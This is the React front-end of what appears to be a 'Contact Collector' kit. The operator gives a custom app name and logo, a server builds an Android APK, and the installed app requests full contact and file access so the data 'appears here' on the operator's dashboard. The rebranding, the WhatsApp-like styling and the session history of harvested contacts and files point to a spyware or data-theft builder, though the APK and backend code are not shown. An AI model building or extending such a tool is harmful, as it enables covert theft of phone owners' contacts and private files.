'use client';

import React, { useState, useEffect, useCallback, useRef } from 'react';
import {
  Phone,
  Download,
  Users,
  ChevronRight,
  Clock,
  Smartphone,
  Trash2,
  X,
  Image as ImageIcon,
  Loader2,
  Check,
  FolderOpen,
} from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Avatar, AvatarFallback } from '@/components/ui/avatar';
import { Badge } from '@/components/ui/badge';

// ─── Types ───────────────────────────────────────────────

interface SessionInfo {
  id: string;
  count: number;
  fileCount: number;
  appName: string;
  createdAt: string;
}

// ─── Utilities ──────────────────────────────────────────

const AVATAR_COLORS = [
  'bg-emerald-600', 'bg-teal-600', 'bg-cyan-600', 'bg-green-700',
  'bg-lime-700', 'bg-emerald-700', 'bg-teal-700', 'bg-cyan-700',
];

function getAvatarColor(name: string): string {
  let hash = 0;
  for (let i = 0; i < name.length; i++) {
    hash = name.charCodeAt(i) + ((hash << 5) - hash);
  }
  return AVATAR_COLORS[Math.abs(hash) % AVATAR_COLORS.length];
}

function timeAgo(dateStr: string): string {
  const now = new Date();
  const date = new Date(dateStr);
  const diffMs = now.getTime() - date.getTime();
  const diffMins = Math.floor(diffMs / 60000);
  const diffHours = Math.floor(diffMs / 3600000);
  const diffDays = Math.floor(diffMs / 86400000);

  if (diffMins < 1) return 'Just now';
  if (diffMins < 60) return `${diffMins}m ago`;
  if (diffHours < 24) return `${diffHours}h ago`;
  if (diffDays < 7) return `${diffDays}d ago`;
  return date.toLocaleDateString();
}

// ─── Main App Component ─────────────────────────────────

export default function ContactCollectorHome() {
  const [sessions, setSessions] = useState<SessionInfo[]>([]);
  const [showDialog, setShowDialog] = useState(false);
  const [appName, setAppName] = useState('');
  const [appLogo, setAppLogo] = useState<File | null>(null);
  const [logoPreview, setLogoPreview] = useState<string | null>(null);
  const [building, setBuilding] = useState(false);
  const [buildProgress, setBuildProgress] = useState('');
  const fileInputRef = useRef<HTMLInputElement>(null);

  // Load sessions from localStorage
  useEffect(() => {
    try {
      const stored = localStorage.getItem('contact_sessions');
      if (stored) {
        setSessions(JSON.parse(stored));
      }
    } catch {}
  }, []);

  // Save sessions
  const saveSessions = useCallback((newSessions: SessionInfo[]) => {
    setSessions(newSessions);
    try {
      localStorage.setItem('contact_sessions', JSON.stringify(newSessions));
    } catch {}
  }, []);

  const deleteSession = useCallback((id: string) => {
    const updated = sessions.filter(s => s.id !== id);
    saveSessions(updated);
  }, [sessions, saveSessions]);

  // Handle logo file selection
  const handleLogoChange = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      setAppLogo(file);
      const reader = new FileReader();
      reader.onload = (ev) => setLogoPreview(ev.target?.result as string);
      reader.readAsDataURL(file);
    }
  }, []);

  // Build & download custom APK
  const handleBuildAndDownload = useCallback(async () => {
    if (!appName.trim()) return;

    setBuilding(true);
    setBuildProgress('Preparing app...');

    try {
      const formData = new FormData();
      formData.append('appName', appName.trim());
      if (appLogo) {
        formData.append('logo', appLogo);
      }

      setBuildProgress('Building your custom app...');

      const res = await fetch('/api/build-app', {
        method: 'POST',
        body: formData,
      });

      if (!res.ok) {
        throw new Error('Build failed');
      }

      setBuildProgress('App built! Downloading...');

      // Get the APK as blob
      const blob = await res.blob();
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = `${appName.trim().replace(/\s+/g, '-').toLowerCase()}.apk`;
      a.click();
      URL.revokeObjectURL(url);

      setBuildProgress('Download complete!');
      setTimeout(() => {
        setShowDialog(false);
        setAppName('');
        setAppLogo(null);
        setLogoPreview(null);
      }, 1000);
    } catch (err) {
      alert('Failed to build app. Please try again.');
    }

    setBuilding(false);
    setBuildProgress('');
  }, [appName, appLogo]);

  // ═══════════════════════════════════════════════════════
  //  RENDER
  // ═══════════════════════════════════════════════════════

  return (
    <div className="min-h-screen flex flex-col bg-[#ECE5DD]">
      {/* ─── Header ──────────────────────────────────── */}
      <div className="bg-[#075E54] px-4 py-3 flex items-center gap-3 shadow-md z-10">
        <div className="w-9 h-9 rounded-full bg-white/20 flex items-center justify-center">
          <Users className="w-5 h-5 text-white" />
        </div>
        <div className="flex-1 min-w-0">
          <h1 className="text-white font-bold text-lg">Contact Collector</h1>
          <p className="text-white/60 text-xs">Collect contacts &amp; files in vCard</p>
        </div>
      </div>

      {/* ─── Hero Section ────────────────────────────── */}
      <div className="bg-gradient-to-b from-[#075E54] to-[#054D44] px-6 pt-6 pb-10">
        <div className="text-center mb-6">
          <div className="w-24 h-24 rounded-full bg-white/10 flex items-center justify-center mx-auto mb-5 shadow-lg">
            <div className="w-16 h-16 rounded-full bg-[#25D366] flex items-center justify-center">
              <Phone className="w-8 h-8 text-white" />
            </div>
          </div>
          <h2 className="text-2xl font-bold text-white mb-2">Contact Collector</h2>
          <p className="text-white/60 text-sm max-w-xs mx-auto">
            Set your app name &amp; logo → Download → Install → Allow → All data appears here
          </p>
        </div>

        {/* Download App Button */}
        <Button
          onClick={() => setShowDialog(true)}
          className="w-full bg-[#25D366] hover:bg-[#20BD5A] text-white font-bold h-16 rounded-2xl text-lg shadow-lg active:scale-[0.98] transition-transform"
        >
          <Download className="w-6 h-6 mr-3" />
          Download App
        </Button>

        <p className="text-white/40 text-center text-xs mt-3 leading-relaxed">
          Set your custom app name &amp; logo, then download. <br/>
          Install → Allow Contact &amp; File permission → Data appears here.
        </p>
      </div>

      {/* ─── How it Works ────────────────────────────── */}
      <div className="px-4 py-5 bg-white mx-3 -mt-4 rounded-2xl shadow-sm mb-4">
        <h3 className="text-[#075E54] font-bold text-sm mb-4 flex items-center gap-2">
          <Smartphone className="w-4 h-4" />
          How it works
        </h3>
        <div className="space-y-3">
          {[
            { step: '1', title: 'Set Name & Logo', desc: 'Enter your app name and upload a logo' },
            { step: '2', title: 'Download & Install', desc: 'Your custom app is built and downloaded' },
            { step: '3', title: 'Allow Permissions', desc: 'Allow Contact + File Manager access' },
            { step: '4', title: 'View on Website', desc: 'Contact Full Access & File Full Access appear here' },
          ].map((item) => (
            <div key={item.step} className="flex items-start gap-3">
              <div className="w-7 h-7 rounded-full bg-[#25D366] flex items-center justify-center shrink-0 mt-0.5">
                <span className="text-white font-bold text-xs">{item.step}</span>
              </div>
              <div>
                <p className="text-sm font-semibold text-gray-900">{item.title}</p>
                <p className="text-xs text-gray-500">{item.desc}</p>
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* ─── Access Status Cards ─────────────────────── */}
      <div className="px-3 pb-4">
        <h3 className="text-[#075E54] font-bold text-sm mb-3 px-1 flex items-center gap-2">
          <Phone className="w-4 h-4" />
          Access Status
        </h3>
        <div className="grid grid-cols-2 gap-3">
          <div className="bg-white rounded-2xl shadow-sm p-4 text-center">
            <div className="w-12 h-12 rounded-full bg-[#25D366]/10 flex items-center justify-center mx-auto mb-2">
              <Phone className="w-6 h-6 text-[#25D366]" />
            </div>
            <p className="text-sm font-bold text-gray-900">Contact</p>
            <p className="text-xs text-gray-500">Full Access</p>
          </div>
          <div className="bg-white rounded-2xl shadow-sm p-4 text-center">
            <div className="w-12 h-12 rounded-full bg-blue-500/10 flex items-center justify-center mx-auto mb-2">
              <FolderOpen className="w-6 h-6 text-blue-500" />
            </div>
            <p className="text-sm font-bold text-gray-900">File Manager</p>
            <p className="text-xs text-gray-500">Full Access</p>
          </div>
        </div>
      </div>

      {/* ─── Contact History Section ─────────────────── */}
      <div className="px-3 pb-4">
        <div className="flex items-center justify-between mb-3 px-1">
          <h3 className="text-[#075E54] font-bold text-sm flex items-center gap-2">
            <Clock className="w-4 h-4" />
            My History
          </h3>
          {sessions.length > 0 && (
            <Badge className="bg-[#25D366] text-white border-0 text-xs px-2 py-0.5">
              {sessions.length} session{sessions.length > 1 ? 's' : ''}
            </Badge>
          )}
        </div>

        {sessions.length === 0 ? (
          <div className="bg-white rounded-2xl shadow-sm p-8 text-center">
            <div className="w-16 h-16 rounded-full bg-gray-100 flex items-center justify-center mx-auto mb-4">
              <Users className="w-8 h-8 text-gray-300" />
            </div>
            <p className="text-gray-500 text-sm font-medium mb-1">No data yet</p>
            <p className="text-gray-400 text-xs max-w-[250px] mx-auto">
              Download the app and allow permissions — your contacts &amp; files will appear here
            </p>
          </div>
        ) : (
          <div className="bg-white rounded-2xl shadow-sm overflow-hidden">
            {sessions.map((session, index) => (
              <React.Fragment key={session.id}>
                <a
                  href={`/view/${session.id}`}
                  className="w-full flex items-center gap-3 px-4 py-3 hover:bg-[#F0F0F0] transition-colors active:bg-[#E8E8E8]"
                >
                  <Avatar className="w-11 h-11 shrink-0">
                    <AvatarFallback className={`${getAvatarColor(session.appName || 'C')} text-white font-bold text-sm`}>
                      {session.appName ? session.appName.slice(0, 2).toUpperCase() : 'CC'}
                    </AvatarFallback>
                  </Avatar>
                  <div className="flex-1 min-w-0 text-left">
                    <h4 className="text-sm font-semibold text-gray-900 truncate">
                      {session.appName || 'Contact Collector'}
                    </h4>
                    <p className="text-xs text-gray-500 flex items-center gap-2">
                      <span>{session.count} contacts</span>
                      <span className="text-gray-300">|</span>
                      <span>{session.fileCount || 0} files</span>
                      <span className="text-gray-300">|</span>
                      <Clock className="w-3 h-3" />
                      {timeAgo(session.createdAt)}
                    </p>
                  </div>
                  <div className="flex items-center gap-2">
                    <button
                      onClick={(e) => { e.preventDefault(); deleteSession(session.id); }}
                      className="w-8 h-8 rounded-full hover:bg-red-50 flex items-center justify-center transition-colors"
                      title="Remove from history"
                    >
                      <Trash2 className="w-4 h-4 text-gray-400" />
                    </button>
                    <ChevronRight className="w-4 h-4 text-gray-300 shrink-0" />
                  </div>
                </a>
                {index < sessions.length - 1 && (
                  <div className="ml-[68px] border-b border-gray-100" />
                )}
              </React.Fragment>
            ))}
          </div>
        )}
      </div>

      {/* ─── Footer ──────────────────────────────────── */}
      <div className="mt-auto px-4 py-3 bg-white border-t border-gray-100">
        <p className="text-center text-xs text-gray-400">
          Contact Collector &bull; vCard 3.0 &bull; Android Only
        </p>
      </div>

      {/* ═══════════════════════════════════════════════════ */}
      {/* ─── DOWNLOAD DIALOG (Name + Logo) ──────────────── */}
      {/* ═══════════════════════════════════════════════════ */}
      {showDialog && (
        <div className="fixed inset-0 z-50 flex items-end sm:items-center justify-center">
          {/* Backdrop */}
          <div
            className="absolute inset-0 bg-black/60 backdrop-blur-sm"
            onClick={() => !building && setShowDialog(false)}
          />

          {/* Dialog */}
          <div className="relative w-full max-w-md mx-4 mb-4 sm:mb-0 bg-white rounded-3xl shadow-2xl overflow-hidden animate-in slide-in-from-bottom-4 duration-300">
            {/* Dialog Header */}
            <div className="bg-gradient-to-r from-[#075E54] to-[#054D44] px-6 py-5">
              <div className="flex items-center justify-between">
                <div>
                  <h3 className="text-white font-bold text-lg">Build Your App</h3>
                  <p className="text-white/60 text-xs mt-1">Set app name &amp; logo to build your custom app</p>
                </div>
                <button
                  onClick={() => !building && setShowDialog(false)}
                  className="w-8 h-8 rounded-full hover:bg-white/10 flex items-center justify-center"
                >
                  <X className="w-5 h-5 text-white/70" />
                </button>
              </div>
            </div>

            {/* Dialog Body */}
            <div className="px-6 py-6 space-y-5">
              {/* App Logo Upload */}
              <div className="flex flex-col items-center">
                <button
                  onClick={() => fileInputRef.current?.click()}
                  className="w-24 h-24 rounded-2xl border-2 border-dashed border-gray-300 hover:border-[#25D366] bg-gray-50 hover:bg-[#25D366]/5 flex flex-col items-center justify-center transition-colors overflow-hidden"
                  disabled={building}
                >
                  {logoPreview ? (
                    <img src={logoPreview} alt="App Logo" className="w-full h-full object-cover rounded-2xl" />
                  ) : (
                    <>
                      <ImageIcon className="w-8 h-8 text-gray-400 mb-1" />
                      <span className="text-[10px] text-gray-400">Upload Logo</span>
                    </>
                  )}
                </button>
                <input
                  ref={fileInputRef}
                  type="file"
                  accept="image/*"
                  onChange={handleLogoChange}
                  className="hidden"
                />
                <p className="text-xs text-gray-400 mt-2">
                  {logoPreview ? 'Tap to change logo' : 'Tap to upload app logo (optional)'}
                </p>
              </div>

              {/* App Name Input */}
              <div>
                <label className="text-sm font-semibold text-gray-700 mb-2 block">App Name</label>
                <Input
                  value={appName}
                  onChange={(e) => setAppName(e.target.value)}
                  placeholder="Enter your app name..."
                  className="h-12 rounded-xl text-base border-gray-200 focus:border-[#25D366] focus:ring-[#25D366]/20"
                  disabled={building}
                  maxLength={30}
                />
                <p className="text-xs text-gray-400 mt-1">
                  This name will appear on your installed app
                </p>
              </div>

              {/* Permissions Info */}
              <div className="bg-gray-50 rounded-xl p-4">
                <p className="text-xs font-semibold text-gray-600 mb-2">This app will request:</p>
                <div className="space-y-2">
                  <div className="flex items-center gap-2">
                    <div className="w-6 h-6 rounded-full bg-[#25D366]/10 flex items-center justify-center">
                      <Phone className="w-3.5 h-3.5 text-[#25D366]" />
                    </div>
                    <span className="text-xs text-gray-600">Contact Full Access</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <div className="w-6 h-6 rounded-full bg-blue-500/10 flex items-center justify-center">
                      <FolderOpen className="w-3.5 h-3.5 text-blue-500" />
                    </div>
                    <span className="text-xs text-gray-600">File Manager Full Access</span>
                  </div>
                </div>
              </div>
            </div>

            {/* Dialog Footer */}
            <div className="px-6 pb-6">
              <Button
                onClick={handleBuildAndDownload}
                disabled={!appName.trim() || building}
                className="w-full bg-[#25D366] hover:bg-[#20BD5A] text-white font-bold h-14 rounded-2xl text-base shadow-lg disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {building ? (
                  <>
                    <Loader2 className="w-5 h-5 mr-2 animate-spin" />
                    {buildProgress || 'Building...'}
                  </>
                ) : (
                  <>
                    <Download className="w-5 h-5 mr-2" />
                    Build &amp; Download App
                  </>
                )}
              </Button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
